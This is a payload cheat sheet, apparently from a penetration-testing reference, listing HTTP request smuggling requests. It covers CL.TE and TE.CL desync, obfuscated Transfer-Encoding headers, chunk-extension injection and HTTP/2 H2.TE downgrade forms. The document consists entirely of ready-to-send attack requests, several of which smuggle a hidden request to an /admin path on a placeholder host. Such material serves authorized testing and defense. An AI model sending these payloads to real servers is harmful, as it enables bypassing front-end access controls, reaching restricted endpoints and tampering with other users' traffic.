---
id: "http-request-smuggling-payloads"
title: "HTTP Request Smuggling Payloads"
type: "payloads"
category: "web-application"
tags: ["hrs", "clte", "tecl"]
updated: "2026-04-16"
---

### Basic CL.TE (Content-Length / Transfer-Encoding)
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 44
Transfer-Encoding: chunked

0

GET /smuggled-endpoint HTTP/1.1
Foo: x
```

### Basic TE.CL (Transfer-Encoding / Content-Length)
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5e
GET /smuggled-endpoint HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

### Obfuscated Transfer-Encoding Headers
```http
Transfer-Encoding: xchunked
Transfer-Encoding[space]: chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding:\n chunked
```

### Chunk Extension Injection
```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

0;key=val\n\nGET /admin HTTP/1.1
X-Ignore: X
```

### H2.TE via HTTP/2 Pseudo-Headers
*(Requires HTTP/2 capable tool like Burp Suite or custom python h2 scripts)*
```http
:method POST
:path /
:authority target.com
transfer-encoding chunked

0

GET /admin HTTP/1.1
Host: target.com
```